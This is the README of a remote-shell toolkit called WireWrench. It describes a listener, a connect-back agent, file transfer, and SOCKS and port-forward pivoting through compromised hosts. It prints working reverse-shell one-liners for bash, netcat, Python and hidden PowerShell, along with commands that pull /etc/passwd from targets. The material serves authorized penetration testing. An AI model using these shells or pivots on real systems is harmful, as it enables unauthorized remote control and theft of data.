# WireWrench

> **A remote shell toolkit** — catch reverse shells, manage sessions, deploy smart agents, transfer files.

WireWrench is a complete rework of the original single-binary REPL into a full client-server remote shell toolkit with a smart agent (`ww-target`) for reliable command execution and file transfer.

By default `ww` talks to `ww-server` over a Unix socket.  Run `ww-server --control-port <PORT>`
to **also** accept `ww` clients over TCP, then point `ww` at it with `-H <host>:<port>` — useful
when the client and server are on different machines.

## Architecture

```
┌─────────────────┐    Unix Socket     ┌──────────────────┐     TCP :4444     ┌─────────────┐
│   ww (client)   │ ◄───────────────► │  ww-server       │ ◄──────────────► │ dumb shell  │
│                 │   JSON over socket │  (daemon)         │   raw TCP        │ (ncat, bash)│
│  • list shells  │                    │                  │                  └─────────────┘
│  • send cmd     │   TCP control (opt)│  • TCP listener  │
│  • interact     │ ◄───────────────►  │  • Smart agent   │     TCP :4446     ┌─────────────┐
│  • script file  │  ww -H host:4445   │  • Session mgmt  │ ◄──────────────► │ ww-target   │
│  • targ push    │                    │  • File transfer │   framed protocol │ (smart agent)│
│  • targ pull    │                    │  • Unix socket   │                  └─────────────┘
│                 │                    │  • TCP control   │
└─────────────────┘                    └──────────────────┘
```

## Platform support

| Binary | Builds & runs on |
|--------|------------------|
| `ww` (client) | Unix (Linux, macOS; BSDs best-effort) |
| `ww-server` | Unix (Linux, macOS; BSDs best-effort) |
| `ww-target` | Unix (Linux, macOS) **and** Windows |

`ww` and `ww-server` are intentionally Unix-only — building them for Windows
fails at compile time with `ww is only intended to be built for unix platforms`.
`ww-target` is the cross-platform agent: deploy the Linux/macOS binary or the
`ww-target.exe` build to any target; a Linux/macOS `ww-server` manages them all
identically over the OS-agnostic framed protocol.

## Quick Start

### Dumb reverse shell (any standard payload)

```bash
# 1. Start the server (listens for reverse shells on :4444)
ww-server

# 2. From a target machine, send a reverse shell:
target$ bash -c 'exec bash -i &>/dev/tcp/10.0.0.5/4444 0>&1'

# 3. List active shells
ww list

# 4. Send a command (polling-based, uses --timeout / -t)
ww send 1 "whoami"

# 5. Interactive mode (Ctrl+C to detach, shell stays alive)
ww interact 1
```

> **Note on dumb-shell stderr:** a dumb shell only relays bytes it actually
> sends over the TCP socket.  Some payloads keep the shell's **stderr** on the
> target's own terminal instead of forwarding it — for example
> `ncat 127.0.0.1 4444 -e /bin/bash` prints `bash: ...: command not found` in
> the *ncat* terminal, so `ww send` can never see it.  Use a payload that merges
> stderr into the socket (the `bash -i &>/dev/tcp/... 0>&1` example above already
> does this) or, with `ncat`, use `--sh-exec "/bin/bash 2>&1"`.

### Smart agent (ww-target)

`ww-target` is a Rust binary you push to the target machine. It gives you **deterministic command execution with exit codes**, file transfers, and no stale-output bugs.

```bash
# 1. Start the server (listens for ww-target on :4446)
ww-server

# 2. On the target machine, run ww-agent connecting back:
target$ ./ww-target 10.0.0.5

# 3. Send commands — exit codes captured, output is exact, no stale data
ww send 1 "uname -a"
# exit code: 0

ww send 1 "cat /etc/passwd | wc -l"
# exit code: 0

ww send 1 "ls /nonexistent"
# exit code: 2

# 4. Upload / download files
ww targ upload 1 ./local-file.txt /tmp/remote-file.txt
ww targ download 1 /etc/passwd ./passwd-backup

# 5. Interactive mode (uses persistent /bin/sh on the target)
ww interact 1
```

## Installation

```bash
cargo install wirewrench
```

Or build from source:

```bash
git clone https://github.com/amrosia/wirewrench
cd wirewrench
cargo build --release
cp target/release/{ww,ww-server,ww-target} ~/.local/bin/
```

## Usage

### Server

```bash
ww-server                          # default: :4444, smart :4446, socket /tmp/wirewrench.sock
ww-server -p 5555                  # custom TCP port for dumb shells
ww-server -P 5556                  # custom smart port for ww-target
ww-server -H 0.0.0.0 -p 8080      # custom host and port
ww-server -s /tmp/ww.sock          # custom socket path
ww-server -c 4445                  # also accept ww clients over TCP (:4445, in addition to the socket)
ww-server -c 4445 -k ~/.ssh/authorized_keys   # ...and require SSH key auth on that port
```

### Client — Shell Commands

```bash
# Local control (default): Unix socket at /tmp/wirewrench.sock
# List active shells (ww-target sessions show their platform, e.g. windows/x86_64)
ww list

# Remote control over TCP (server must run with `ww-server --control-port`)
ww -H 10.0.0.5:4445 list        # host and port together; the port is required
ww -H 10.0.0.5:4445 send 1 "uname -a"
ww -H 10.0.0.5:4445 -i ~/.ssh/id_ed25519 list   # authenticate with a private key

# Send a command (smart agent: waits until command finishes; dumb shell: polls with timeout)
ww send 1 "uname -a"

# Explicit timeout (default: 0 = no timeout for smart agents, 3s fallback for dumb shells)
ww send -t 5 1 "sleep 10; echo done"

# Interactive shell session (Ctrl+C to detach, shell stays alive)
ww interact 1

# Run commands from a file (lines starting with # are skipped)
ww script 1 payloads.txt

# Close/kill a shell
ww close 1
```

### Client — File Transfer (smart agent only)

```bash
# Upload a file to the target
ww targ upload 1 ./exploit.sh /tmp/exploit.sh

# Download a file from the target
ww targ download 1 /etc/passwd ./passwd

# Specify a timeout for large files (default: 30s)
ww targ upload -t 60 1 ./big-file.bin /tmp/big-file.bin

# Cancel an ongoing transfer
ww targ cancel 1
```

### Client — Pivoting (TCP tunnels)

Reach hosts that only the **target** can reach.  Both commands dial *from*
the `ww-target` agent; the only new listener is a local one on your machine
(default loopback).  Requires a `ww-target` that advertises the `tunnel`
feature — that is **v3.4.0 or later** (the tunneling work was developed as
"3.3.0", but no 3.3.0 release was ever published).

`ww forward` maps **one fixed destination**: the `-L [bind:]lport:host:port`
spec names it up front.  Use `ww socks` when the destination is not known in
advance — it listens on a single local port and the client names the target per
connection, so any TCP host the agent can reach is one proxy setting away.

```bash
# Forward one local port: [bind:]lport:host:port (default bind 127.0.0.1)
ww forward 1 -L 127.0.0.1:8080:10.0.0.5:80
curl http://127.0.0.1:8080/            # reaches 10.0.0.5:80 via the target

# SOCKS5 + HTTP CONNECT proxy on 127.0.0.1:1080 (same port, first-byte sniff)
ww socks 1
curl --socks5-hostname 127.0.0.1:1080 http://internal.corp/
curl -x http://127.0.0.1:1080 --proxytunnel https://internal.corp/
```

`ww socks` options:

| Flag | Meaning |
|------|---------|
| `--listen ADDR` | Listen address (default `127.0.0.1:1080`) |
| `--local-dns` | Resolve destination names in `ww` instead of on the target |
| `--socks-user U --socks-pass P` | Require SOCKS5 username/password (RFC 1929) |
| `--socks-only` | Disable HTTP CONNECT; answer it with `501` |
| `--connect-timeout SECS` | How long the target waits to connect (default 10) |
| `--exit-on-disconnect` | Stop the listener when the target session dies |

- **Remote DNS by default**: `ATYP 0x03` names are passed through and resolved
  on the target, so internal DNS works (`proxychains` `proxy_dns = on` also works).
  Use `--local-dns` to resolve in `ww` instead.
- **Bind is loopback by default**; binding anywhere else prints a loud warning —
  there is no destination ACL in v1, so the loopback bind is the real control.
- **SOCKS5 auth covers SOCKS5 only.**  HTTP CONNECT has no credential support, so
  it is answered with `501` whenever `--socks-user/--socks-pass` are set (use
  `--socks-only` to say so explicitly).  `--socks-pass` can also be supplied as
  `WW_SOCKS_PASS`, which keeps it out of `ps` output and shell history.
- **Limits**: 64 simultaneous streams per session (agent *and* server), 600 s
  idle reaping (`ww-target --max-streams`, `--idle-timeout`), 128 concurrent
  local connections per listener, and a best-effort refusal to dial the agent's
  own server (the literal host, plus any address the target would resolve it to).
- **Stalled streams**: the link is multiplexed, so a destination that stops
  reading cannot be given TCP backpressure per stream.  A stream whose per-stream
  write queue fills up is reset with the reason `stream stalled` rather than
  blocking (or silently dropping) every other stream.
- **Session lifetime**: listeners are bound to the session id they were started
  with.  If the target reconnects it gets a *new* id; restart the listener with
  that id (or use `--exit-on-disconnect`).  New connections during the gap are
  refused with SOCKS reply `0x01`.
- **Scope**: TCP `CONNECT` only.  `BIND` and UDP `ASSOCIATE` are answered with
  `0x07`; there is no UDP/ICMP, so QUIC, WireGuard and UDP DNS do not tunnel.

#### proxychains / nmap notes

- proxychains-ng sends **hostnames** and does *not* hook `shutdown()`, so plain
  `SHUT_WR` arrives as EOF — the tunnel propagates it as a half-close instead of
  tearing the stream down.  Its `tcp_connect_time_out` (8 s default) is honoured
  because refused/black-holed connects answer promptly with `0x05`/`0x06`.
- Point proxychains at an **IPv4 numeric** proxy address (`127.0.0.1`), not a
  hostname.
- nmap needs TCP connect scans and no ping through the proxy:
  `nmap -sT -Pn <ip>` with either numeric IPs (`proxy_dns off`) or
  `nmap --proxies socks4://…` style HTTP CONNECT.  UDP scan (`-sU`) cannot work.

## Control-port authentication

When the TCP control port is exposed to a network (`ww-server -c`), you can
require SSH-style public-key authentication.  The Unix socket is **never**
authenticated — keys apply only to the TCP control listener.

```bash
# Server: authorize public keys (a single authorized_keys-style file, or a
# folder of such files — one key per line)
ww-server -c 4445 -k ~/.ssh/authorized_keys

# Client: present the matching private key (like ssh -i)
ww -H 10.0.0.5:4445 -i ~/.ssh/id_ed25519 send 1 "uname -a"
```

- **Key types**: ed25519, RSA, ECDSA — anything `ssh-keygen` produces.
- **Passphrases**: encrypted private keys prompt for a passphrase on the terminal.
- **Without `-k`**, `ww-server -c` still runs but prints a loud
  `⚠ WARNING` that the control port is unauthenticated.
- **Errors**: connecting without a key to an authenticated server, or offering
  the wrong key, fails with a clear, non-zero-exit message.

Default key locations can be stored instead of passing flags every time:

```ini
# ~/.config/wirewrench/server.conf
control_public_keys = ~/.ssh/authorized_keys
```

```ini
# ~/.config/wirewrench/client.conf
host = 10.0.0.5:4445    # default control target (HOST:PORT); overridden by -H
identity = ~/.ssh/id_ed25519
# several keys are tried in order:
identity = ~/.ssh/id_rsa
```

With these set, a plain `ww list` / `ww send 1 "cmd"` connects over TCP to
the configured host using the configured key — no flags needed.  Explicit
`-H`/`-i` always override the config values.

The handshake mirrors ssh: the client offers a public key, the server replies
with a fresh per-connection challenge, the client signs it with the private
key, and the server verifies the signature against the authorized key set —
which is re-read on every connection, so key rotation needs no restart.

## Smart Agent (`ww-target`)

`ww-target` is a lightweight Rust agent that connects back to `ww-server` on the **smart port** (default `:4446`) using a framed binary protocol.

```bash
ww-target 10.0.0.5                       # connect back and stay connected
ww-target 10.0.0.5 --max-streams 64      # cap simultaneous tunnels (default 64)
ww-target 10.0.0.5 --idle-timeout 600    # reap idle tunnels after N seconds
ww-target 10.0.0.5 --no-reconnect        # exit when the session ends
```

### Why use it over a dumb shell?

| Feature | Dumb shell (ncat/bash) | ww-target |
|---------|------------------------|-----------|
| **Command boundaries** | None — output bleeds between commands | Deterministic — each command is `sh -c` (or `cmd /C` on Windows), captured via `wait_with_output()` |
| **Exit codes** | Not available | Captured and returned |
| **Stale output** | Common — old output pollutes next command | Impossible — per-command sequence numbers |
| **File transfer** | Manual (base64 tricks) | Built-in push/pull with SHA-256 verification |
| **Timeout default** | 3s polling cap | No default — waits as long as the command needs |
| **State between commands** | Persistent shell | Stateless (each `ww send` is a fresh `sh -c`) |
| **Interactive mode** | Persistent shell | Persistent shell (separate code path via FRAME_SHELL) |

### Cross-platform target

`ww-target` runs on Linux, macOS, and Windows. Server-side behavior is identical
regardless of target OS, and `ww list` shows each session's platform (e.g.
`windows/x86_64`).

**Windows targets** — build `ww-target.exe` (see CI, or cross-compile with the
`x86_64-pc-windows-gnu` target + mingw-w64) and run it on the target:

```powershell
C:\> ww-target.exe 10.0.0.5
```

Commands execute via `cmd.exe /C` (resolved from `%COMSPEC%`), so use Windows
shell syntax: `dir` not `ls`, `type` not `cat`. Command output is decoded as
UTF-8; non-ASCII console output is best-effort. Override the shell with
`--shell powershell` (or `--shell C:\Path\To\Shell.exe`); on Unix the default
is `/bin/sh`.

**macOS targets** — use the `aarch64-apple-darwin` (Apple Silicon) or
`x86_64-apple-darwin` (Intel) build. The default shell is `/bin/sh`.

```bash
target$ ./ww-target 10.0.0.5
```

macOS may quarantine downloaded binaries — clear it with
`xattr -d com.apple.quarantine ww-target`, and approve the firewall prompt the
first time `ww-server` binds a listening port.

### Protocol

`ww-target` uses a framed binary protocol over TCP:

| Frame | Code | Direction | Purpose |
|-------|------|-----------|---------|
| `FRAME_SHELL` | `0x01` | Bidirectional | Raw shell stdin/stdout (interactive mode) |
| `FRAME_HANDSHAKE` | `0x02` | Bidirectional | Initial identity exchange |
| `FRAME_FILE_CTRL` | `0x03` | Bidirectional | File transfer coordination (JSON) |
| `FRAME_FILE_DATA` | `0x04` | Server → Target | Raw file bytes during push |
| `FRAME_CANCEL` | `0x05` | Bidirectional | Abort file transfer |
| `FRAME_HASH` | `0x06` | Bidirectional | SHA-256 verification |
| `FRAME_KEEPALIVE` | `0x07` | Bidirectional | Heartbeat |
| `FRAME_CMD` | `0x08` | Server → Target | Execute `sh -c` command (JSON: `{seq, cmd}`) |
| `FRAME_CMD_RESULT` | `0x09` | Target → Server | Command result (JSON: `{seq, exit_code, stdout, stderr}`) |
| `FRAME_TUNNEL_OPEN` | `0x0A` | Server → Target | Open a tunnel stream (JSON: `{stream_id, host, port, connect_timeout}`) |
| `FRAME_TUNNEL_OPENED` | `0x0B` | Target → Server | Tunnel open result (JSON: `{stream_id, ok, bound?, errno?, message?}`) |
| `FRAME_TUNNEL_DATA` | `0x0C` | Bidirectional | Raw tunnel bytes (`[stream_id: u32 LE][bytes]`) |
| `FRAME_TUNNEL_EOF` | `0x0D` | Bidirectional | Half-close one direction (`[stream_id: u32 LE]`) |
| `FRAME_TUNNEL_CLOSE` | `0x0E` | Bidirectional | Tear down a stream (JSON: `{stream_id, reason}`) |

The handshake carries an optional `features` list (absent on old peers): a `ww-target`
that supports tunnels advertises `"tunnel"`, and the server refuses `connect` requests
for sessions that don't. All tunnel frames are additive — older peers log an unknown
frame type and ignore them.

### Reverse Shell One-Liners (Dumb Shells)

If you can't deploy `ww-target`, standard reverse shells still work:

```bash
# Bash
target$ bash -c 'exec bash -i &>/dev/tcp/10.0.0.5/4444 0>&1'

# Netcat (traditional)
target$ nc -e /bin/sh 10.0.0.5 4444

# Netcat with stderr forwarded (nmap ncat)
target$ ncat 10.0.0.5 4444 --sh-exec "/bin/bash 2>&1"

# Netcat (OpenBSD)
target$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 4444 > /tmp/f

# Python
target$ python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("10.0.0.5",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# PowerShell
target> powershell -NoP -NonI -W Hidden -Exec Bypass -C "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

## Features

- **Dual-mode shell handling** — dumb reverse shells (raw TCP) and smart agents (framed protocol)
- **Deterministic command execution** — `ww-target` uses per-command `sh -c` with `wait_with_output()`, returning exact stdout, stderr, and exit code
- **No stale output** — per-command sequence numbers in `FRAME_CMD`/`FRAME_CMD_RESULT` prevent output from bleeding between commands
- **File transfers** — push/pull files with SHA-256 hash verification
- **Pivoting** — `ww forward` (one port) and `ww socks` (SOCKS5 + HTTP CONNECT) dial *from* the target, so you can reach hosts only it can see; the only new listener is a loopback port on your machine
- **Interactive mode** — full raw terminal, line editing, word navigation, Ctrl+C detach
- **Scripting** — run command lists from files with comment and empty-line support
- **Session persistence** — shells stay alive when you detach from interactive mode
- **JSON-over-Unix-socket API** — extensible control protocol

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for version history.

## License

AGPL-3.0-or-later
